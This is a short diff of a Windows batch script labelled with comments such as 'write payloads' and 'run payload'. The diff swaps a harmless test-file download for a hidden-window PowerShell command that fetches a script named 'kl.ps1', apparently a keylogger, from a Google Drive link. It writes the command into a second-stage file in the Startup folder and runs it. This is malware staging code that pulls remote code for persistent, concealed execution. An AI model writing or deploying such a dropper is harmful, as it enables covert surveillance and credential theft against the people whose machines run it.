@@ -12,7 +12,7 @@ cd "%STARTUP%"
 @REM write payloads
 ( 
     @echo off
-    echo powershell -c "Invoke-WebRequest -Uri 'http://ipv4.download.thinkbroadband.com/10MB.zip' -OutFile 'test.zip'"
+    echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://drive.google.com/file/d/1uSz1ypRtIMx0nZuy4VhFI4fCulHKLYwE/view?usp=sharing -OutFile kl.ps1"
 ) > stage2.cmd
 
 @REM run payload
